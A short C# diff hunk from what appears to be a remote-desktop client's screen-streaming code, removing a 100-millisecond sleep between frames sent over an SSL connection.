@@ -51,7 +51,6 @@ namespace Client.Handle_Packet
                             SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                             SslClient.Write(msgpack.Encode2Bytes());
                             SslClient.Flush();
-                            Thread.Sleep(100);
                         }
                     }
                     bmp.UnlockBits(bmpData);
